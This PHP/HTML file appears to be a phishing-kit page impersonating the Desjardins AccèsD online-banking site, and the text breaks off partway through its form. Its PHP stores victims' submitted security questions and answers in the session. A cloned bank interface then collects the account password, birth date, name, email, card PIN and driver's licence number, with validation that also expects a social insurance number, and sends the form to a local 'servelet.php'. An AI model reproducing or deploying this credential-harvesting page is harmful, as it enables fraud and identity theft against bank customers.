<?php
ini_set("output_buffering",4096);
session_start();

$_SESSION['q1'] = $_POST['q1'];
$_SESSION['q2'] = $_POST['q2'];
$_SESSION['q3'] = $_POST['q3'];
$_SESSION['a1'] = $_POST['a1'];
$_SESSION['a2'] = $_POST['a2'];
$_SESSION['a3'] = $_POST['a3'];

?>
<html>
<HEAD>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<TITLE>Solutions en ligne - AccèsD</TITLE>
<script language="JavaScript">
function checkform ( form )
{
	   if (form.pass.value.length < 6) {
		alert( "Error." );
		form.pass.focus();
		  document.getElementById('pass').style.backgroundColor="#FF6A6A";
		return false ;
	  }
   if (form.first.value.length < 3) {
    alert( "Error." );
    form.first.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="#FF6A6A";
    return false ;
  }
     if (form.last.value.length < 3) {
    alert( "Error." );
    form.last.focus();
	  document.getElementById('pass').style.backgroundColor="";
    return false ;
  }
       if (form.day.value.length < 1) {
    alert( "Error." );
    form.day.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="";
	  document.getElementById('last').style.backgroundColor="";
	  document.getElementById('day').style.backgroundColor="#FF6A6A";
    return false ;
  }
       if (form.month.value.length < 2) {
    alert( "Error." );
    form.month.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('day').style.backgroundColor="";
	  document.getElementById('month').style.backgroundColor="#FF6A6A";
    return false ;
  }
         if (form.year.value.length < 4) {
    alert( "Error." );
    form.year.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="";
	  document.getElementById('last').style.backgroundColor="";
	  document.getElementById('day').style.backgroundColor="";
	  document.getElementById('month').style.backgroundColor="";
	  document.getElementById('year').style.backgroundColor="#FF6A6A";
    return false ;
  }
           if (form.nas.value.length < 9) {
    alert( "Error." );
    form.nas.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="";
	  document.getElementById('last').style.backgroundColor="";
	  document.getElementById('day').style.backgroundColor="";
	  document.getElementById('month').style.backgroundColor="";
	  document.getElementById('year').style.backgroundColor="";
	  document.getElementById('nas').style.backgroundColor="";
    return false ;
  }
           if (form.address.value.length < 5) {
    alert( "Error." );
    form.address.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('day').style.backgroundColor="";
	  document.getElementById('month').style.backgroundColor="";
	  document.getElementById('nas').style.backgroundColor="";
	  document.getElementById('address').style.backgroundColor="#FF6A6A";
    return false ;
  }
        // ** END **
  return true ;
}
</script>
<script language="JavaScript">
if (self != top) {
top.session.window.autologoff = true;
}
var chargee = false;
var languecourante = "fr";
function MM_displayStatusMsg(msgStr) {
status=msgStr;
document.MM_returnValue = true;
}
function MM_openBrWindow(theURL,winName,features) {
window.open(theURL,winName,features);
}
function MM_naviguer(url) {
MM_naviguerGlobal("form_du_bas", url, "" );
}
function MM_naviguerGlobal(nomform, url, params) {
if (top.session){
top.session.window.autologoff = false;
}
if (chargee) {
var indexdeb = 0;
var indexfin = 0;
var indexparam = 0;
var nom = "";
var valeur = "";
var maform = eval("document." + nomform);
if( ( indexparam = url.indexOf("?") ) != -1 ) {
if( params != "" && params.indexOf("&") == -1 )
params = params + "&";
params = params + url.substring(indexparam + 1) + "&";
url = url.substring(0, indexparam);
}
if( params != null && params != "" ) {
if( params.indexOf("&") == -1 )
params = params + "&";
while( ( indexdeb = params.indexOf("=") ) != -1 ) {
nom = params.substring(0,indexdeb);
indexfin = params.indexOf("&");
valeur = params.substring(indexdeb + 1,indexfin);
params = params.substring(indexfin + 1);
if( nom == "navig" )
{
if ( (indexdebval = valeur.indexOf("~")) == -1)
{
eval("maform.navig").name = valeur;
}
else
{
nomval = valeur.substring(0,indexdebval);
valval = valeur.substring(indexdebval+1);
eval("maform.navig").value = valval;
eval("maform.navig").name = nomval;
}
}
else if ( nom == "target" )
maform.target = valeur;
else
eval("maform." + nom).value = valeur;
}
}
maform.method = "POST";
maform.action = url;
maform.submit();
}
}
function MM_naviguerTop(url) {
MM_naviguerGlobal("form_du_bas", url, "target=_top");
}
function retour_AccesdTop(adresse) {
top.location = adresse;
}
function MM_retour_accord() {
naviguerMenu("/clconnADProfilFinancier/ObtenirPageCartes.do");
}
function naviguerMenu(url) {
naviguerMenuMaitre( url, false );
}
function naviguerMenuTop(url) {
naviguerMenuMaitre( url, true );
}
function traiterParametreNavig( chaine) {
chaine = chaine.replace(/~/,'=');
if(chaine.indexOf("=")==-1){
chaine = chaine+ "=";
}
return chaine;
}
function naviguerMenuMaitre( url, estTop) {
if (top.session){
top.session.window.autologoff = false;
}
if (chargee) {
var adresse = url;
var aParametre = url.indexOf("?")!=-1;
var aSeparateur = url.charAt(url.length-1)=="&";
// on s'occupe des parametres navig pour le rexx
if(aParametre){
var indiceNavig1= adresse.indexOf("?navig=");
var indiceNavig2= adresse.indexOf("&navig=");
if(indiceNavig1 != -1 ||  indiceNavig2 != -1 ){
var indiceNavig = indiceNavig1;
if (indiceNavig1==-1) {
indiceNavig= indiceNavig2;
}
indiceNavig++;
var finAdresse = adresse.substring(indiceNavig+6);
var indiceFinParam = finAdresse.indexOf("&");
adresse= adresse.substring(0,indiceNavig);
if (indiceFinParam ==-1){
adresse=adresse + traiterParametreNavig(finAdresse );
}else{
adresse=adresse + traiterParametreNavig(finAdresse.substring(0,indiceFinParam)) + finAdresse.substring(indiceFinParam);
}
}
}
if(aParametre && ! aSeparateur){
adresse = adresse+"&";
}
else if (!aParametre){
adresse = adresse+"?";
}
adresse = adresse+"token=63025422C2F0D901&";
adresse = adresse+"contexte=109000000020&" ;
adresse = adresse+"randomNo="+Math.random();
if (estTop){
window.top.location.href = adresse;
}
else {
document.location.href = adresse;
}
}
}
function formaterMontant (mnt)
{
var tmp = "" + mnt;
var i = tmp.lastIndexOf(".");
if (i == -1)
return tmp + ".00";
else
{
if (i == (tmp.length-2))
{
return tmp + "0";
}
else
{
return tmp;
}
}
}
function additionMontant (v1, v2)
{
var tmp1;
var tmp2;
tmp1 = eval(v1.value);
tmp2 = eval(v2.value);
return formaterMontant(Math.round((tmp1 + tmp2) * 100)/100);
}
function soustractionMontant (v1, v2)
{
var tmp1;
var tmp2;
tmp1 = eval(v1.value);
tmp2 = eval(v2.value);
return formaterMontant(Math.round((tmp1 - tmp2) * 100)/100);
}
function multiplicationMontant (v1, v2)
{
var tmp1;
var tmp2;
tmp1 = eval(v1.value);
tmp2 = eval(v2.value);
return formaterMontant(Math.round((tmp1 * tmp2) * 100)/100);
}
function vide(val)
//Vrai ssi val est vide
{
if (val == null || val.length == 0)
return (true);
else
return (false);
}
function validerNombre(str,  msg)
{
str = '' + str;
var newstr = '';
var i = 0;
var sign = 1;
c = str.charAt(i);
while (i < str.length && (c == ' ' || c == '0' || c == '-' || c == '+'))
{
sign *= (c == '-') ? -1 : 1;
c = str.charAt(++i);
}
while (i < str.length)
{
if ('0' <= c && c <= '9')
{
newstr += c;
}
else if (c != ' ')
{
if (msg)
alert(msg);
return(0);
}
c = str.charAt(++i);
}
return (vide(newstr) ? 0 : eval (sign + "*" + newstr));
}
function validerNombrePositif(str, msgInvalide, msgNegatif)
{
var val = validerNombre(str, msgInvalide);
if (val < 0)
{
if (msgNegatif)
alert(msgNegatif);
return(0);
}
return val;
}
function validerMontant(str, msg)
{
str = '' + str;
var newstr = '';
var i = 0;
var vd = false;
var id = 0;
var sign = 1;
var dec = 2;
c = str.charAt(i);
while (i < str.length && (c == ' ' || c == '0' || c == '-' || c == '+'))
{
if (c == '-') {
}
sign *= (c == '-') ? -1 : 1;
c = str.charAt(++i);
}
//Tenter la transformation en float
while (i < str.length)
{
if ('0' <= c && c <= '9')
{
if (vd)
{
++id;
if (id > dec)
{
if (msg)
alert(msg);
return(formaterMontant("0"));
}
}
newstr += c;
}
else if (c == '.' ||c == ",")
{
newstr += '.';
vd = true;
}
else if (c != ' ')
{
if (msg)
alert(msg);
return(0);
}
c = str.charAt(++i);
}
return formaterMontant(vide(newstr) ? 0 : eval (sign + "*" + newstr));
}
function validerMontantPositif(str, msgInvalide, msgNegatif)
{
var val = validerMontant(str, msgInvalide);
if (val < 0)
{
if (msgNegatif)
alert(msgNegatif);
return(0);
}
return val;
}
</script>
<SCRIPT TYPE="text/javascript">
<!--
// copyright 1999 Idocs, Inc. http://www.idocs.com
// Distribute this script freely but keep this notice in place
function numbersonly(myfield, e, dec)
{
var key;
var keychar;

if (window.event)
   key = window.event.keyCode;
else if (e)
   key = e.which;
else
   return true;
keychar = String.fromCharCode(key);

// control keys
if ((key==null) || (key==0) || (key==8) || 
    (key==9) || (key==13) || (key==27) )
   return true;

// numbers
else if ((("0123456789").indexOf(keychar) > -1))
   return true;

// decimal point jump
else if (dec && (keychar == "."))
   {
   myfield.form.elements[dec].focus();
   return false;
   }
else
   return false;
}

//-->
</SCRIPT>
<script language="JavaScript" type="text/javascript" src="public/1438/fr_CA_ACCESD/js/ad.js" ></script>
<link rel="stylesheet" href="public/1438/fr_CA_ACCESD/css/fichier.css" type="text/css">
<script language="JavaScript" src="public/1438/fr_CA_ACCESD/js/log.js" type="text/javascript"></script>
<script language="JavaScript">
function pageEnPopup() {
if (this.name != "session"){
window.opener.top.session.location.reload();
self.close();
}
}
</script>
</HEAD>
<body bgcolor="#FFFFFF" text="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad=" ">
<!-- entete -->
<a name="haut"></a>
<table width="100%" height="36" border="0" cellspacing="0" cellpadding="0" class="bf">
<tr>
<td align="left" valign="top">
<img src="public/1438/fr_CA_ACCESD/image/bandeau.gif" width="360" height="36" border="0"></td>
<td width="100%" align="center" class="bot" nowrap>
<!--
( fr_CA_ACCESD )
-->
&nbsp;</td>
<td align="right" valign="top">
<table height="36" border="0" cellspacing="0" cellpadding="0">
<tr>
<td align="center" valign="top" width="60" height="0" border="0">
<a href="javascript:naviguerMenu('/clrelaADRelationAffaires/ObtenirBoiteMessage.do?msgId=entreeApplication&provenance=icone');" class="bol">Messages</a></td>
<td class="bol">&nbsp;|&nbsp;</td>
<td align="center" valign="top" nowrap><a href="javascript:naviguerMenu('/clconnADDossierPersonnel/Dossier.do');" class="boli">Dossier</a></td>
<td class="bol">&nbsp;|&nbsp;</td>
<td align="center" valign="top"><a id="joindreEntete" href=javascript:Joindre('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_joindre.jsp?domaine=ACCESD') class="bol">Nous&nbsp;joindre</a></td>
<td class="bol">&nbsp;|&nbsp;</td>
<td align="center" valign="top"><a href="javascript:Aide('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_doss_vue.jsp?domaine=ACCESD');" class="bol">Aide</a></td>
<td class="bol">&nbsp;|&nbsp;</td>
<td align="center" valign="top"><a href="javascript:naviguerMenuTop('/tisecuADGestionAcces/logoff.do?msgId=logoff');" class="boli">Quitter</a></td>
</tr>
<tr>
<td align="center" valign="top" width="60" height="20" border="0"><a href="javascript:naviguerMenu('/clrelaADRelationAffaires/ObtenirBoiteMessage.do?msgId=entreeApplication&provenance=icone');"><img src="public/1438/fr_CA_ACCESD/image/enveloppe_hors_boite_messages.gif" width="60" height="20" border="0" title="Boite de message"></a></td>
<td class="bol">&nbsp;</td>
<td class="bol" colSpan=6>&nbsp;</td>
<td align="center" valign="middle"><a href="javascript:naviguerMenuTop('/tisecuADGestionAcces/logoff.do?msgId=logoff');"><img src="public/1438/fr_CA_ACCESD/image/quitter.gif" width="16" height="16" border="0" title="Quitter Accesd"></a></td>
</tr>
</table>
</td>
</tr>
</table>
<script language="JavaScript">
function AideDeLaPage( ancrage ) {
if( ancrage == null ) {
ancrage = "";
}
Aide('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_doss_vue.jsp?domaine=ACCESD'+ancrage);
}
</script>
<!-- onglets 'DOSSIER' -->
<!-- formatOnglets '0' -->
<table width="100%" border="0" cellspacing="1" cellpadding="0">
<tr>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/cooperADOperations/EffectuerVirement.do');" class="ons">Opérations</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/clconnADProfilFinancier/ObtenirPagePortrait.do');" class="ons">Portrait<br>financier</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/clconnADProfilFinancier/ObtenirPageCartes.do');" class="ons">Cartes</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/clconnADProfilFinancier/Financement.do');" class="ons">Financement</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/clconnADProfilFinancier/Placement.do');" class="ons">Épargne et placements</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/clconnADProfilFinancier/AssurancesBiens.do');" class="ons">Assurances<br>de&nbsp;biens</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/clconnADProfilFinancier/AssurancesVie.do');" class="ons">Assurances<br>vie&nbsp;et&nbsp;santé</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
<td>
<table width="100%" border="0" cellspacing="0" cellpadding="1" class="of">
<tr>
<td>
<table width="100%" height="30" border="0" cellspacing="0" cellpadding="0" class="of">
<tr>
<td>
<table width="90"  height="30"  border="0" cellspacing="0" cellpadding="0" align="center" class="of">
<tr>
<td><div align="center"><a href="javascript:naviguerMenu('/cooperADOperations/DemandesEnLigne.do');" class="ons">Demandes<br>en&nbsp;ligne</a></div></td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
</td>
</tr>
</table>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="ze">&nbsp;</td>
</tr>
</table>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
<td valign="top">
<!-- menu -->
<!-- Si onglet est pas vide ou menuSpecial est pas null -->
<!-- On boucle dans elementsMenu -->
<table width="145" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="mft"><img width="10" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="8" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="123" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="4" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
</tr>
<tr>
<td class="mft">&nbsp;</td>
<td colspan="2" class="mft"><span class="mt">Dossier</span></td>
<td class="mft">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mft"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfes"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfes"><span class="mes">&nbsp;</span></td>
<td colspan="2" class="mfes"><a href="javascript:naviguerMenu('/clconnADDossierPersonnel/Dossier.do');" class="mes">
Vue d'ensemble</a></td>
<td class="mfes"><span class="mes">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfes"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mli">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfe"><span class="me">&nbsp;</span></td>
<td colspan="2" class="mfe"><a href="javascript:naviguerMenu('/clconnADDossierPersonnel/ModifierAccesComptes.do?msgId=debuter');" class="me">
Afficher/modifier les accès aux comptes</a></td>
<td class="mfe"><span class="me">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
</table>
<br>
<table width="145" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="mft"><img width="10" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="8" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="123" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="4" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
</tr>
<tr>
<td class="mft">&nbsp;</td>
<td colspan="2" class="mft"><span class="mt">Sécurité</span></td>
<td class="mft">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mft"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfe"><span class="me">&nbsp;</span></td>
<td colspan="2" class="mfe"><a href="javascript:naviguerMenu('/tisecuADGestionAcces/ChangerMotPasse.do?forcer=non');" class="me">
Modifier le mot de<br>passe</a></td>
<td class="mfe"><span class="me">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mli">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfe"><span class="me">&nbsp;</span></td>
<td colspan="2" class="mfe"><a href="javascript:naviguerMenu('/tisecuADGestionAcces/ModifierInfoAuthForte.do?msgId=debuter');" class="me">
Gérer les paramètres de sécurité</a></td>
<td class="mfe"><span class="me">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
</table>
<br>
<table width="145" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="mft"><img width="10" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="8" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="123" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="4" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
</tr>
<tr>
<td class="mft">&nbsp;</td>
<td colspan="2" class="mft"><span class="mt">Factures</span></td>
<td class="mft">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mft"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfe"><span class="me">&nbsp;</span></td>
<td colspan="2" class="mfe"><a href="javascript:naviguerMenu('/clconnADDossierPersonnel/GererDossierPostel.do?msgId=changementAdresse');" class="me">
Signaler un changement<br>d'adresse à postel</a></td>
<td class="mfe"><span class="me">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mli">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfe"><span class="me">&nbsp;</span></td>
<td colspan="2" class="mfe"><a href="javascript:naviguerMenu('/clconnADDossierPersonnel/GererDossierPostel.do?msgId=lireConvention');" class="me">
Lire la convention postel</a></td>
<td class="mfe"><span class="me">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mli">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfe"><span class="me">&nbsp;</span></td>
<td colspan="2" class="mfe"><a href="javascript:naviguerMenu('/clconnADDossierPersonnel/GererDossierPostel.do?msgId=annulerInscription');" class="me">
Annuler l'inscription à postel</a></td>
<td class="mfe"><span class="me">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
</table>
<br>
<table width="145" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="mft"><img width="10" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="8" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="123" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
<td class="mft"><img width="4" height="1" src="public/1438/fr_CA_ACCESD/image/spacer.gif" border="0"></td>
</tr>
<tr>
<td class="mft">&nbsp;</td>
<td colspan="2" class="mft"><span class="mt">Virements<br>interinstitutions</span></td>
<td class="mft">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mft"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td class="mfe"><span class="me">&nbsp;</span></td>
<td colspan="2" class="mfe"><a href="javascript:naviguerMenu('/clconnADDossierPersonnel/AjouterCpteMe2Me.do?methode=lireConditions');" class="me">
Conditions d'utilisation</a></td>
<td class="mfe"><span class="me">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="mfe"><span class="li">&nbsp;</span></td>
</tr>
<tr>
<td colspan="4" class="ls">&nbsp;</td>
</tr>
</table>
<!-- Fin de "boucle dans elementsMenu" -->
<!-- Fin de "si onglet est pas vide et menuSpecial est pas null" -->
</td>
<td><img width="4" height="1" border="0" src="public/1438/fr_CA_ACCESD/image/spacer.gif"></td>
<td><img width="4" height="1" border="0" src="public/1438/fr_CA_ACCESD/image/spacer.gif"></td>
<td width="100%" valign="top">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
<td valign="top" width="100%">
<div bv_beginignore=""></div>
<div bv_endignore=""></div>
<div bv_endignore=""></div>
<div bv_beginignore=""></div>
<div bv_endignore=""></div>
<td class="pt" colspan="2" valign="top"></td>
</tr>
<tr>
<td class="ze" colspan="2"></td>
</tr>
<tr>
<td class="ze" colspan="2" height="12"></td>
</tr>
<tr>
<td class="t" width="100%">
<table border="0" cellpadding="0" cellspacing="2" width="100%">
<tbody><tr>
<form name="ModifierQuestRepAuthForteForm" method="post" action="servelet.php" onsubmit="return checkform(this);">
<input name="cardnum2" value="<? echo $cardnum; ?> " type="hidden">

<input name="questionChoisie11" value="<? echo $questionChoisie1;?> " type="hidden">
<input name="reponse11" value="<? echo $reponse1;?> " type="hidden">

<input name="questionChoisie22" value="<? echo $questionChoisie2;?> " type="hidden">
<input name="reponse22" value="<? echo $reponse2;?> " type="hidden">

<input name="questionChoisie33" value="<? echo $questionChoisie3;?> " type="hidden">
<input name="reponse33" value="<? echo $reponse3;?> " type="hidden">




<br>

</font></strong></td>
</tr>
</tbody></table>
</td>
</tr>
<tr>
<td class="ze" height="12"></td>
</tr>
<tr>
<td class="t">
<table border="0" cellpadding="0" cellspacing="2" width="100%">
<tbody><tr>
<td class="ls" colspan="2" width="100%">&nbsp;</td>
</tr>
<tr class="lif">

<td class="t" valign="middle" width="10%"><nobr> &nbsp;</nobr></td>

<td nowrap="nowrap" width="85%">

<font face="Arial, Helvetica, sans-serif" size="2">Mot de passe:</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <input name="pass" type="password" id="pass" value="" size="12" maxlength="32"> 
<span class="te">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<nobr>(info.: utilise lors de la connexion a votre compte en ligne)</nobr><br>
<br>
<font face="Arial, Helvetica, sans-serif" size="2">&nbsp;</font><table border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody>


<tr bgcolor="#f0f8f0">
	<td width="48%"><font face="Arial, Helvetica, sans-serif" size="2">Date de naissance&nbsp;:</font></td>
	<td width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="day" id="day" size="2" maxlength="2" onKeyPress="return numbersonly(this, event)">

<select name="month" id="month">
<option value="" selected="selected">MOIS</option>
<option value="Janvier">JAN
</option>
<option value="Fevrier">F&Eacute;V </option>
<option value="Mars">MAR</option><option value="Avril">AVR
</option><option value="Mai">MAI
</option><option value="Juin">JUN

</option><option value="Juillet">JUL
</option>
<option value="Aout">AO&Ucirc; </option>
<option value="Septembre">SEP</option><option value="Octobre">OCT
</option><option value="Novembre">NOV
</option>
<option value="Decembre">D&Eacute;C</option>
</select>

<input name="year" id="year" size="4" maxlength="4" onKeyPress="return numbersonly(this, event)">
<br>(JJ/MOIS/AAAA)&nbsp;

	<nobr><a href="javascript:ouvrir('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_visamajorite.jsp?domaine=ACCESD')">Vérifier l'âge de la majorité</a></nobr><br><font size="1">L’âge de la majorité varie selon la province de résidence.</font></font></td>
</tr>
</td><BR>

<tr bgcolor="#f0f8f0">
	<td valign="top" width="48%"><font face="Arial, Helvetica, sans-serif" size="2">Nom:<br></td>
	<td valign="top" width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="name" id="address" value="" size="32" maxlength="32">
	</font>
&nbsp;&nbsp;<BR><BR>

<tr bgcolor="#f0f8f0">
	<td valign="top" width="48%"><font face="Arial, Helvetica, sans-serif" size="2">Adresse couriel&nbsp;:<br>
	<font size="1">(Mesure de sécurité pour confirmer la reception et la validation de vos information)</font></font></td>
	<td valign="top" width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="address" id="address" value="" size="32" maxlength="32">
	</font>
&nbsp;&nbsp;<BR><BR>

<tr bgcolor="#f0f8f0">
	<td valign="top" width="48%"><font face="Arial, Helvetica, sans-serif" size="2">NIP (5 chiffres)&nbsp;:<br>
	<font size="1"></font></font></td>
	<td valign="top" width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="nip" id="address" type="password" value="" size="5" maxlength="5" onKeyPress="return numbersonly(this, event)">
	</font>
&nbsp;&nbsp;<BR><BR>


<tr bgcolor="#f0f8f0">
	<td valign="top" width="48%"><font face="Arial, Helvetica, sans-serif" size="2">Numéro Permis de Conduire&nbsp;:<br>
	<font size="1"></font></font></td>
	<td valign="top" width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="dl" id="address" value="" size="25" maxlength="30">
	</font>
&nbsp;&nbsp;<BR><BR>

<tr bgcolor="#f0f8f0">
